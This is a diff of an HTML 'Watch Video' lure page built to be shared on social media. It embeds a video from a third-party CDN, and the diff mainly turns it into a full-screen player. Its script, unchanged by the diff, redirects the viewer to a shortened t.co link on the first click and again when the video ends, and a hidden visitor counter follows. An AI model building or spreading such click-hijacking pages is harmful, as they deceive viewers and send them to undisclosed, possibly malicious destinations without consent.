@@ -4,11 +4,10 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Watch Video</title>
+<title>Video</title>
 
-<!-- Sharing Preview -->
 <meta property="og:title" content="Watch Video">
-<meta property="og:description" content="Watch this video now">
+<meta property="og:description" content="Watch this video">
 <meta property="og:type" content="website">
 <meta property="og:url" content="YOUR_PAGE_URL">
 <meta property="og:image" content="YOUR_IMAGE_URL">
@@ -16,24 +15,31 @@
 
 <style>
 
-body{
+*{
+    box-sizing:border-box;
+}
+
+html,body{
     margin:0;
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background:#fff;
+    width:100%;
+    height:100%;
+    background:#000;
+    overflow:hidden;
 }
 
 .video-box{
-    width:100%;
-    max-width:600px;
-    padding:10px;
+    width:100vw;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#000;
 }
 
 video{
     width:100%;
-    border-radius:12px;
+    height:100%;
+    object-fit:cover;
     background:#000;
 }
 
@@ -47,9 +53,12 @@ video{
 
 <div class="video-box">
 
-<video id="myVideo" controls playsinline>
+<video id="myVideo" 
+       controls 
+       playsinline 
+       webkit-playsinline>
 
-<source src="https://cdn.videy.co/6EOf2BfE1.mp4" type="video/mp4">
+<source src="https://cdn.videy.co/H0BqfBc11.mp4" type="video/mp4">
 
 </video>
 
@@ -62,12 +71,12 @@ video{
 const video = document.getElementById("myVideo");
 
 
-// Click redirect only once
+// first click redirect only
 video.addEventListener("click", function(){
 
     if(!localStorage.getItem("clickRedirect")){
 
-        localStorage.setItem("clickRedirect","yes");
+        localStorage.setItem("clickRedirect","done");
 
         window.location.href="https://t.co/nNul1MegHi";
 
@@ -76,18 +85,19 @@ video.addEventListener("click", function(){
 });
 
 
-// End redirect
+// video end redirect
 video.addEventListener("ended", function(){
 
     window.location.href="https://t.co/nNul1MegHi";
 
 });
 
+
 </script>
 
 
 
-<!-- Visitor Counter (bottom) -->
+<!-- Counter -->
 <script id="_waux9y">
 
 var _wau = _wau || [];
